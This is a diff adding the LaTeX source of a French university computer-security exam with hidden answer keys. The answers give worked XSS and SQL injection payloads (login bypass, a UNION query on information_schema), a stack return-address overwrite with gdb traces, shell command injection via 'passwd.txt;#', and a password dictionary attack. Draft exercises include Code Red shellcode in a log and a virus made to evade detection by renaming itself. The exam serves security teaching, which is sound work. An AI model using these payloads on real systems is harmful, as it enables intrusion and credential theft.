@@ -1,0 +1,618 @@
+\documentclass[a4paper,9pt]{article}
+
+
+\usepackage{fullpage}
+\usepackage[all]{xy}
+\usepackage[utf8]{inputenc}
+\usepackage{amsmath,amsthm}
+\usepackage{amsfonts}
+%\usepackage{algorithm}
+\usepackage{graphicx}
+%\usepackage[compatible,noend]{algpseudocode}
+\usepackage{latexsym}
+\usepackage{float,color}
+\usepackage{framed}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{comment}
+
+
+\definecolor{shadecolor}{RGB}{200,200,200}
+%\definecolor{shadecolor}{RGB}{0,0,0}
+
+
+\newenvironment{terminal}{\color{black}\begin{snugshade*}}
+{\end{snugshade*}\color{black}}
+
+
+%%%%%%%%%%%%%%% COMMANDES %%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\itemb}{\item[$\bullet$]}
+
+%% Les ensembles de modelisation
+\newcommand{\Ki}{\mathcal{K}}
+\newcommand{\Ci}{\mathcal{C}}
+\newcommand{\Mi}{\mathcal{M}}
+\newcommand{\Ei}{\mathcal{E}}
+\newcommand{\Di}{\mathcal{D}}
+
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\Znat}{\mathbb{Z}}
+\newcommand{\Nnat}{\mathbb{N}}
+\newcommand{\pgcd}{\mbox{pgcd}}
+
+%%%%%%%%%%%%%%% ENVIRONEMENTS %%%%%%%%%%%%%%%%%%%%%%%
+
+
+\theoremstyle{plain}
+\newtheorem{lemme}{Lemme}
+\newtheorem{algorithme}{ Algorithme }
+\newtheorem{corolaire}{Corollaire}
+\newtheorem{propriete}{Propri\'et\'e}
+\newtheorem{proposition}{Proposition}
+\newtheorem{theoreme} {Th\'eor\`eme}
+\newtheorem{definition}{D\'efinition}
+
+\theoremstyle{definition}
+\newtheorem*{probleme}{ProblÃ¨me}
+\newtheorem*{cout}{CoÃ»t}
+\newtheorem*{fait}{Fait}
+\newtheorem*{notation}{Notation}
+\newtheorem*{complexite}{Complexit\'e}
+\newtheorem{exercice}{Exercice}
+%\theoremstyle{remark}
+\newtheorem{remarque}{Remarque}
+\newtheorem{exemple}{Exemple}
+%\newtheorem*{correction}{Correction}
+\excludecomment{correction}
+
+%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\definecolor{mGreen}{rgb}{0,0.6,0}
+\definecolor{mGray}{rgb}{0.5,0.5,0.5}
+\definecolor{mPurple}{rgb}{0.58,0,0.82}
+\definecolor{backgroundColour}{rgb}{0.85,0.85,0.85}
+
+
+\lstdefinestyle{CStyle}{
+    backgroundcolor=\color{backgroundColour},   
+    commentstyle=\color{mGreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{mGray},
+    stringstyle=\color{mPurple},
+    basicstyle=\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2,
+    language=C
+}
+
+
+%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\begin{document}
+
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+\noindent \textbf{Université de Perpignan} \hfill  Année \the\year \\
+Licence 3 Informatique \hfill C. Legrand \\
+
+\begin{center}
+  {  {\scshape \large Contrôle Terminal 2}
+    \medskip
+    
+{\scshape    S\'ecurit\'e Informatique}  \\
+}
+
+
+
+\end{center}
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}
+%\hline
+
+\bigskip
+
+\bigskip
+
+
+\noindent\textit{Recommandations.}
+\begin{itemize}
+  %\item Tout document (papier ou électronique (pdf, doc, txt) ) est  autorisé.
+  \item Les notes de cours et de TD sont autorisés.
+\item Vous devrez rendre une copie \'electronique (en format .txt) de l'examen.
+%\item Vous l'enverrez en pi\`ece jointe à l'adresse email suivante
+%\begin{center}
+%\texttt{cedric.legrand@univ-perp.fr}
+%\end{center}
+%ou me la transmettrez sur une clef usb.
+\end{itemize}
+
+
+
+
+\begin{exercice}[Vulnérabilités des applications web]
+  On considère la page web \verb|page-5-commentaires.php| avec la base de données de \verb|bd-table-commentaires.sql| (cf. archive exo1.tar).
+  \begin{enumerate}
+  \item Expliquez ce que fait la page. 
+  \item Proposez une solution pour qu'un message d'alerte comme celui ci dessous s'affiche au chargement de la page.
+    \begin{center}
+\includegraphics[width=8cm]{inject-alert1.png}
+      \end{center}
+  \item Expliquez comment faire pour faire apparaître de facon frauduleuse une partie References comme dans l'image ci-dessous.
+     \begin{center}
+\includegraphics[width=8cm]{inject-references1.png}
+      \end{center}
+    \item Comment peut-on eviter les injections des questions 2) et 3) dans la page web? 
+     %\item Comment faire pour que la page web soit de-suite redirigée vers \verb|ma-page-pirate.html| ?
+
+    \end{enumerate}
+  \end{exercice}
+
+\begin{correction}
+\begin{enumerate}
+\item La page présente un article court en html sur la sécurité. Elle ensuite une requête dans une base de donnée
+\verb|requete à récupérer dans le fichier|
+  cette requette récupère les 5 entrées de plus grand identifiant d'une page contenant des commentaires.  Elle met en forme ces commentaires dans une liste non ordonnées. Enfin un formulaire permet de rentrer un nouveau commentaire.
+\item Un solution consiste à entrer :
+\begin{verbatim}
+pseudo : Blackhat  (sans importance)
+comment : some comment <script> alert(\"Your computer will explode soon\") </script>
+\end{verbatim}
+\item Une solution consiste à entrer :
+\begin{verbatim}
+pseudo : Vilain
+comment : Outstanding! </li></ul><h2> References </h2> See link htt://pirate.com for more info.
+\end{verbatim}
+Puis à ajouter les commentaires de martin, yann et john pour compléter la liste de commentaires.
+\item Avant de stocker ces entrées dans la base de données,  il faut désactiver les balises html, ce qui implique qu'il faut remplacer chaque \verb|<| ou \verb|>| par \verb|&gt;| et \verb|&lt;| respectivement, 
+  \end{enumerate}
+\end{correction}
+
+
+
+\begin{exercice}
+  On considère la page web \verb|liste-taches-sql.php| avec les tables SQL données dans \verb|bd-liste-taches.sql| (cf. archive exo2.tar). Cette page permet d'accéder à une liste de taches assignées à une personne d'une entretprise :
+\begin{small}
+    \lstinputlisting[firstline=1,lastline=100,style=CStyle]{Exo2/liste-taches-sql.php}
+    \end{small}
+Le mot de passe est vérifié pour restreindre l'accès, et n'afficher que les entrées d'un utilisateur.
+\begin{enumerate}
+\item Donnez les entrées du formulaire pour que l'on affiche l'intégralité de la table Taches.
+\item  Dans MySQL les données relatives aux utilisateurs et aux différentes tables des bases de données  sont maintenu dans les tables de la base de données \verb|information_schema|. Les tables de la base de données \verb|information_schema| sont accéssible en lecture. Donnez les entrées du formulaire afin de lui faire afficher le nom des tables présents sur la base de donnée. Ces nom se trouve dans la table \verb|TABLE| de \verb|INFORMATION_SCHEMA|. (Indication : utiliser l'opérateur \verb|UNION| de SQL). 
+
+\end{enumerate}
+\end{exercice}
+
+
+\begin{correction}
+  \begin{enumerate}
+  \item Une solution est:
+    \begin{verbatim}
+Login: Marc" OR 1=1 OR 2="1
+Mot de passe: anything
+\end{verbatim}
+  \item Une solution est:
+    \begin{verbatim}
+Login: Marc 
+Mode de passe: 1234"UNION SELECT " " AS login, "2014-01-01" as date, CONCAT(TABLE_SCHEMA,'.',TABLE_NAME) as tache FROM information_schema.tables WHERE "1"="1
+\end{verbatim}
+    \end{enumerate}
+\end{correction}
+
+
+
+\begin{exercice}
+On considère le code C suivant :
+\begin{terminal}
+\begin{verbatim}
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#define N 20
+
+void g()
+{
+  printf("on est dans la fonction secrete\n");
+}
+void f()
+{
+  unsigned long T[4];
+  int i;
+  
+  T[0]=0;
+  T[1]=1;
+  T[2]=2;
+  T[3]=3;
+
+  printf("i=");
+  scanf("%d",&i);
+  printf("Old T[i]=%016lx\nNew T[i]=",T[i]);  
+  scanf("%lx",T+i);
+    
+  return;
+}
+
+int main()
+{
+  f();
+  return(0);
+}
+\end{verbatim}
+\end{terminal}
+  \begin{enumerate}
+  \item Avec \verb|gdb| analysez le code exécutable obtenu après compilation avec les options
+\begin{verbatim}
+   -fno-stack-protector -fno-pie
+\end{verbatim}
+et donnez pour la fonction \verb|f|:
+\begin{itemize}
+\item La taille de l'espace mémoire de la fonction \verb|f| et les instructions servant à définir cet espace mémoire.
+\item Les instructions servant à faire l'appel à \verb|printf("i=");|.
+\item Où se situent les éléments du tableau \verb|T| ? 
+\end{itemize}
+\item Comment dérouter le programme pour que la fonction \verb|g| soient exécutée ? 
+\item Même question que la précédente mais sans l'option de compilation \verb|-no-pie|.
+  
+%\end{itemize}
+
+%\item vulnérabilité system : trouver... page 328 du livre de gildas avoine. 
+%\item ou vulnérabilité sur les entrées-sorties : trouver...
+   \end{enumerate}
+\end{exercice}
+
+
+\begin{correction}
+  \begin{enumerate}
+  \item Voici le code assembleur correspondant à la fonction \verb|f|
+\begin{terminal}\small
+\begin{verbatim}
+Dump of assembler code for function f:
+   0x000000000040118d <+0>:	endbr64 
+   0x0000000000401191 <+4>:	push   rbp
+   0x0000000000401192 <+5>:	mov    rbp,rsp
+   0x0000000000401195 <+8>:	sub    rsp,0x30
+   0x0000000000401199 <+12>:	mov    QWORD PTR [rbp-0x20],0x0
+   0x00000000004011a1 <+20>:	mov    QWORD PTR [rbp-0x18],0x1
+   0x00000000004011a9 <+28>:	mov    QWORD PTR [rbp-0x10],0x2
+   0x00000000004011b1 <+36>:	mov    QWORD PTR [rbp-0x8],0x3
+   0x00000000004011b9 <+44>:	lea    rdi,[rip+0xe68]        # 0x402028
+   0x00000000004011c0 <+51>:	mov    eax,0x0
+   0x00000000004011c5 <+56>:	call   0x401070 <printf@plt>
+   0x00000000004011ca <+61>:	lea    rax,[rbp-0x24]
+   0x00000000004011ce <+65>:	mov    rsi,rax
+   0x00000000004011d1 <+68>:	lea    rdi,[rip+0xe53]        # 0x40202b
+   0x00000000004011d8 <+75>:	mov    eax,0x0
+   0x00000000004011dd <+80>:	call   0x401080 <__isoc99_scanf@plt>
+   0x00000000004011e2 <+85>:	mov    eax,DWORD PTR [rbp-0x24]
+   0x00000000004011e5 <+88>:	cdqe   
+   0x00000000004011e7 <+90>:	mov    rax,QWORD PTR [rbp+rax*8-0x20]
+   0x00000000004011ec <+95>:	mov    rsi,rax
+   0x00000000004011ef <+98>:	lea    rdi,[rip+0xe38]        # 0x40202e
+   0x00000000004011f6 <+105>:	mov    eax,0x0
+   0x00000000004011fb <+110>:	call   0x401070 <printf@plt>
+   0x0000000000401200 <+115>:	mov    eax,DWORD PTR [rbp-0x24]
+   0x0000000000401203 <+118>:	cdqe   
+   0x0000000000401205 <+120>:	lea    rdx,[rax*8+0x0]
+   0x000000000040120d <+128>:	lea    rax,[rbp-0x20]
+   0x0000000000401211 <+132>:	add    rax,rdx
+   0x0000000000401214 <+135>:	mov    rsi,rax
+   0x0000000000401217 <+138>:	lea    rdi,[rip+0xe2a]        # 0x402048
+   0x000000000040121e <+145>:	mov    eax,0x0
+   0x0000000000401223 <+150>:	call   0x401080 <__isoc99_scanf@plt>
+   0x0000000000401228 <+155>:	nop
+   0x0000000000401229 <+156>:	leave  
+   0x000000000040122a <+157>:	ret    
+End of assembler dump.
+\end{verbatim}
+\end{terminal}
+\begin{itemize}
+\item Les instructions correspondant à la mise en place de l'espace mémoire de la fonction \verb|f| sont les suivants:
+\begin{terminal}\small
+\begin{verbatim}
+   0x0000000000401191 <+4>:	push   rbp
+   0x0000000000401192 <+5>:	mov    rbp,rsp
+   0x0000000000401195 <+8>:	sub    rsp,0x30
+\end{verbatim}
+\end{terminal}
+On sauvegarde \verb|rbp|, puis on affecte \verb|rsp| à \verb|rbp| et on décrémente \verb|rsp| de \verb|0x30=48|. 
+L'espace mémoire de la fonction \verb|f| se sistue entre \verb|rsp| et\verb|rbp| donc est de \verb|48| octets.
+
+\item Les instructions 
+
+\begin{terminal}\small
+\begin{verbatim}
+   0x0000000000401199 <+12>:	mov    QWORD PTR [rbp-0x20],0x0
+   0x00000000004011a1 <+20>:	mov    QWORD PTR [rbp-0x18],0x1
+   0x00000000004011a9 <+28>:	mov    QWORD PTR [rbp-0x10],0x2
+   0x00000000004011b1 <+36>:	mov    QWORD PTR [rbp-0x8],0x3
+\end{verbatim}
+\end{terminal}
+correspondent aux affectation \verb|T[0]=0,...,T[3]=3| du code C. Les instructions pour l'appel \verb|printf("i=")| sont situés juste-après:
+
+\begin{terminal}\small
+\begin{verbatim}
+   0x00000000004011b9 <+44>:	lea    rdi,[rip+0xe68]        # 0x402028
+   0x00000000004011c0 <+51>:	mov    eax,0x0
+   0x00000000004011c5 <+56>:	call   0x401070 <printf@plt>
+\end{verbatim}
+\end{terminal}
+
+  \end{itemize}
+\item Pour dérouter le programme vers la fonction \verb|g| il faut modifier la valeur sauvegardée (Savedrip) de \verb|rip| sur la pile. On choisit \verb|i| de facon à ce que lors du \verb|scanf("%lx",T+i);| on écrive sur \verb|rip|:
+  \begin{itemize}
+    \item On a vu en cours que sur les 8 octets  d'adresses  \verb|rbp,rbp+1,...,rbp+7| se trouve Savedrbp. Sur les 8 octets qui suivent ( d'adresses  \verb|rbp+8,...,rbp+15|)  se trouve Savedrip.
+  \item
+
+    \verb|T[0]| est situé à l'adresse \verb|rbp-0x20|, ..., \verb|T[3]| est situé à l'adresse \verb|rbp-0x8|. Donc \verb|T[4]| sera situé à l'adresse \verb|rbp| et \verb|T[5]| sera à l'adresse \verb|rbp+8| qui est celle de savedrip.
+  \item Donc il faut entrer la valeur \verb|i=5|  et ensuite  entrer \verb|T[i]=0x0000000000401176| qui est la valeur de l'adresse de \verb|g|: on le voit en desassemblant \verb|g|) 
+     \begin{terminal}
+\begin{verbatim}
+   (gdb) disassemble g
+Dump of assembler code for function g:
+   0x0000000000401176 <+0>:	endbr64 
+   0x000000000040117a <+4>:	push   %rbp
+   0x000000000040117b <+5>:	mov    %rsp,%rbp
+   0x000000000040117e <+8>:	lea    0xe83(%rip),%rdi        # 0x402008
+   0x0000000000401185 <+15>:	callq  0x401060 <puts@plt>
+   0x000000000040118a <+20>:	nop
+   0x000000000040118b <+21>:	pop    %rbp
+   0x000000000040118c <+22>:	retq   
+End of assembler dump.
+\end{verbatim}
+    \end{terminal}
+  \end{itemize}
+  Voici une trace d'exécution :
+  \begin{terminal}
+\begin{verbatim}
+user@cpc:~$ ./remplir-tab 
+i=5
+Old T[i]=000000000040123d
+New T[i]=0x401176
+on est dans la fonction secrete
+Segmentation fault (core dumped)
+\end{verbatim}
+\end{terminal}
+  On a bien exécuté la fonction \verb|g|.
+
+\item Ici la difficulté c'est que les adresses varient à chaque exécution car il n'y a plus l'option \verb|no-pie|. Mais on peut remarquer que l'écart entre le code du \verb|main| et celui de \verb|g| lui ne varie pas (pour cela afficher les adresses de \verb|main| et \verb|g| pour plusieurs exécutions pour le voir). Pour déterminer cet écart on désassemble \verb|main| et \verb|g|:
+\begin{terminal}
+\begin{verbatim}
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x000000000040122b <+0>:	endbr64 
+   0x000000000040122f <+4>:	push   %rbp
+   0x0000000000401230 <+5>:	mov    %rsp,%rbp
+   0x0000000000401233 <+8>:	mov    $0x0,%eax
+   0x0000000000401238 <+13>:	callq  0x40118d <f>
+   0x000000000040123d <+18>:	mov    $0x0,%eax
+   0x0000000000401242 <+23>:	pop    %rbp
+   0x0000000000401243 <+24>:	retq   
+End of assembler dump.
+ (gdb) disassemble g
+Dump of assembler code for function g:
+   0x0000000000401176 <+0>:	endbr64 
+   0x000000000040117a <+4>:	push   %rbp
+   0x000000000040117b <+5>:	mov    %rsp,%rbp
+   0x000000000040117e <+8>:	lea    0xe83(%rip),%rdi        # 0x402008
+   0x0000000000401185 <+15>:	callq  0x401060 <puts@plt>
+   0x000000000040118a <+20>:	nop
+   0x000000000040118b <+21>:	pop    %rbp
+   0x000000000040118c <+22>:	retq   
+End of assembler dump.
+\end{verbatim}
+\end{terminal}
+L'écart est de \verb|0x000000000040122-b0x0000000000401176| entre le début de \verb|main| et celui de \verb|g| et cet écart ne bougera pas quel que soit l'éxécution. 
+
+
+L'adresse sauvegardée de rip est affichée par le programme (dans l'exemple de la question 2)  elle vallait 000000000040123d), c'est l'instruction après le \verb|call f| du \verb|main|. Donc pour trouver l'adresse de \verb|g| à partir de cet adresse  il suffit de lui soustraire le décalage avec \verb|g|. Autrement dit il faut ajouter
+\begin{verbatim}
+0x000000000040123d-0x0000000000401176 = 199
+\end{verbatim}
+Voici une trace de l'exécution dans ce cas:
+\begin{terminal}
+\begin{verbatim}
+user@pc:~$ gcc -g  -fno-stack-protector remplir-tab.c -o remplir-tab
+user@pc:~$ ./remplir-tab 
+i=5
+Old T[i]=000055870ffa3250
+New T[i]=55870ffa3189
+on est dans la fonction secrete
+Segmentation fault (core dumped)
+\end{verbatim}
+\end{terminal}
+\end{enumerate}
+
+\end{correction}
+
+
+
+\begin{exercice}
+  Dans l'archive \verb|exo4.tar| vous trouverez les fichiers utiles à cet exercice. On considère le programme  qui sert à visualiser des fichiers de transactions financières. Ce code est donné ci-dessous:
+  \begin{small}
+    \lstinputlisting[firstline=1,lastline=100,style=CStyle]{affiche-transaction.c}
+    \end{small}
+%\lstinputlisting{affiche-transaction.c} 
+%\lstinputlisting{affiche-transaction.c} 
+%\usepackage{listings}
+%$$ inclure le fichier $$
+%\lstinputlisting[lastline=4]{listings.sty}
+%\begin{lstlisting}
+% \input{affiche-transaction.c}
+%\end{lstlisting}
+
+Voici brièvement ce que fait ce code:
+\begin{itemize}
+\item La fonction \verb|auth|: les  droits d'accès de l'utilisateur sont vérifié via leur mot de passe, et en comparant son haché avec celui stocké dans le fichier \verb|passwd.txt|.
+\item La fonction \verb|main|, après la vérification faite avec \verb|auth|, le programme demande l'année $YYYY$ des transactions et affiche le fichier correspondant par la commande:
+\begin{verbatim}
+user@pc:~$ cat   YYYY-transactions.txt
+\end{verbatim}
+\end{itemize}
+
+Répondre aux questions suivantes (elles sont indépendantes):
+\begin{enumerate}
+\item Proposez une solution (qui n'implique pas de débordement de tampon) pour que l'utilisateur puisse visualiser le contenu du fichier \verb|passwd.txt|.
+  \item Avec un débordement de tampon, faites en sorte de ne pas faire de  \verb|cat| mais de lister le contenu du répertoire.
+\item Connaissant les hachés des autres utilisateurs (qui se trouvent dans  \verb|passwd.txt|), en particulier du \verb|admin|, faire un programme C qui hache les mots de passe les plus courants qui se trouvent dans le fichier \verb|dictionnaire.txt| afin de retrouver celui de l'utilisateur \verb|admin|. Vous pouvez réutiliser la fonction hachage du programme \verb|affiche-transaction.c|.
+  \end{enumerate}
+
+
+\end{exercice}
+
+
+\begin{correction}
+\begin{enumerate}
+\item Il faut modifier  la commande \verb|bash| exécutée par \verb|system| comme suit:
+  \begin{itemize}
+  \item l'entrée \verb|YYYY| est utilisée pour mettre le fichier \verb|passwd.txt| en argument du \verb|cat|.
+  \item  On met ensuite un \verb|#| pour commenter ce qui suit (le \verb|-tansactions.txt| qui est concaténé).
+  \end{itemize}
+  Voici une trace d'exécution
+\begin{terminal}
+\begin{verbatim}
+user@pc:~$ ./affiche-transaction julien aaaa
+pw_hash=ScMbjFG7X0lduHhErJ8sb.
+Entrez l'année des transactions:passwd.txt;#
+command=cat passwd.txt;#-transactions.txt
+marc   ScMbjFG7X0lduHhErJ8sb.
+julien  ZJzeyzrAsFeetibF7X6Ow.
+\end{verbatim}
+\end{terminal}
+\item Ici il faut faire un débordement de tampon afin de modifier \verb|cat| en \verb|ls;#|. Les tableaux de caractères  \verb|nom|,\verb|passwd|,\verb|annee| et \verb|command| sont contigus en mémoire. Donc en faisant déborder le tableau \verb|annee| on peut modifier le début de la chaine de caractères \verb|command|. Essayons en ajoutant des commentaires \#....\# avant \verb|ls;#| jusqu'à le faire apparaitre au début de command:
+\begin{terminal}
+\begin{verbatim}
+user@pc:~$ ./affiche-transaction julien aaaa
+pw_hash=ZJzeyzrAsFeetibF7X6Ow.
+Entrez l'année des transactions:###############ls;#
+command=cat ###############ls;#-transactions.txt
+user@pc:~$ ./affiche-transaction julien aaaa
+pw_hash=ZJzeyzrAsFeetibF7X6Ow.
+Entrez l'année des transactions:###################ls;#
+command=;####################ls;####################ls;-transactions.txt
+sh: 1: Syntax error: ";" unexpected
+*** stack smashing detected ***: terminated
+Aborted (core dumped)
+user@pc:~$ ./affiche-transaction julien aaaa
+pw_hash=ZJzeyzrAsFeetibF7X6Ow.
+Entrez l'année des transactions:#####################ls;#
+command=ls;######################ls;##-transactions.txt
+2000-transactions.txt  affiche-transaction.c   attaque-dictionnaire.c~		 overflow-nom-fichier.c~  remplir-tab.c
+affiche-tab.c	       affiche-transaction.c~  calc.c				 passwd.txt		  remplir-tab.c~
+affiche-tab.c~	       a.out		       calc.c~				 passwd.txt~		  transaction-2000.txt~
+affiche-transaction    attaque-dictionnaire.c  dictionnary-french-passwords.txt  remplir-tab
+\end{verbatim}
+\item Le corrigé  est donné dans le fichier \verb|attaque-dictionnaire.c|.
+\end{terminal}
+\end{enumerate}
+
+\end{correction}
+
+
+\end{document}
+
+
+\begin{exercice}[hack de mot de passe]
+  L'identification sur un système se fait par comparaison du hachage (avec une fonction de hachage de type \texttt{md5sum}, \texttt{sha1sum}, ou autre) d'un mot de passe avec le haché (ou l'empreinte) sauvegardée sur le système.
+  On peut calculer le hachage avec md5sum avec la fonction \texttt{crypt} ci-dessous de la bibliothèque \texttt{crypt.h}:
+  \begin{verbatim}
+ char *crypt(const char *phrase, const char *setting);
+    \end{verbatim}
+Voici un exemple de programme qui  calcule  le haché du mot de passe "102239":
+  \begin{terminal}
+\begin{verbatim}
+clegrand@clegrand-M14xR2:~/Desktop$ cat exemple-crypt.c
+#include <stdio.h>
+#include <crypt.h>
+
+int main(int argc, char *argv[])
+{
+  char md5[] = "$1$";
+  char *res;
+  res = crypt("102239", md5);
+  printf("le haché avec md5sum de \"102239\" vaut %s\n",res);
+}
+clegrand@clegrand-M14xR2:~/Desktop$ gcc exemple-crypt.c -lcrypt
+clegrand@clegrand-M14xR2:~/Desktop$ ./a.out 
+le haché avec md5sum de "102239" vaut $1$$vg7yzq8fpLem3Ht5fj44L.
+\end{verbatim}
+\end{terminal}
+
+\end{exercice}
+
+
+\begin{exercice}
+\begin{enumerate}
+\item Vulnérabilité réseau : à trouver : empoisonnement DNS.
+  \end{enumerate}
+  \end{exercice}
+
+
+\begin{exercice}
+Tentative d'attaque du ver \texttt{Code Red}: les logs d'un serveur web contient une série d'entrées du type [\texttt{adresse source, date, requête, résultat, octet transférer}]. Expliquez la particularité du log suivant:
+\begin{verbatim}
+64.163.156.186-[10/Feb/2005:02:37:24 +0100] << GET /default.ida ? NNNNNNNNNNNNNNNNNN
+NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%
+u7801%u9090%u6858%ucb%u78011%u90901%u9090%8190%u00c3%u0003%u8b00%531b%u53ff%u0078%u0
+000%u00=a HTTP/1.0" 400 333
+\end{verbatim}
+
+\end{exercice}
+
+\begin{exercice}
+  Débordement de tampon.
+  \begin{itemize}
+  \item Débordement sur le nom d'un fichier ``sensible''. 
+  \item Débordement normal, comme ceux-vu en cours. 
+    \end{itemize}
+\end{exercice}
+
+%% la suite N sert a priori de bourrage 
+%% pour que la fin de la chaine deborde du tampon
+%% et qu'un code malicieux soit executé à la place 
+%% du code du serveur web
+
+\begin{exercice}
+Soit le site \texttt{www.unsitecomplice.fr}, le moyen de vérifier qu'il est vulnérable à une attaque \textit{cross site scripting} est de demander l'affichage d'une page inexistante. La particularité du nom de cette page est le fait qu'il contient des balises HTML:
+\begin{verbatim}
+   http://wwww.unsitecomplice.fr/<B>nimportequoi</B>&g.html
+\end{verbatim}
+Erreur la page nimportequoi.html est introuvable.
+
+\begin{enumerate}
+\item Pour quelles raisons le site est-il vulnérable? 
+\item Qui peut-être la victime : les internautes ou le site web?
+\item Donner un scénario d'attaque possible via un \texttt{www.unsitecomplice.fr} (par exemple en utilisant l'ingénierie sociale).
+\end{enumerate}
+\end{exercice}
+
+%% il est vulnerable car les balises html du nom de fichier ont ete interprete
+%% le site web peut servir de ``complice''. 
+%% Par ingenieurie sociale on redirige vers le site en metant dans la barre 
+%% d'adresse un faux fichier contenant une fausse page html
+%% et un script pour pouvoir recuperer, par exemple, un mot de passe 
+
+
+
+
+
+
+\begin{exercice}
+Modifier le virus résident vu en TD (exercice 1, Feuille TD 4 sur les vers), pour qu'il change de nom régulièrement:
+\begin{enumerate}
+\item Première approche: vous modifierez le nom en ajoutant  le \texttt{pid} (du père ou du fils) dans le nom du programme.
+\item Deuxième approche: vous analyserez les processus en cours d'exécution et utiliserez de façon aléatoire le nom de l'un d'eux  pour le nom du programme lors du rafraîchissement.
+\end{enumerate}
+\end{exercice}
+
+
+\end{document}
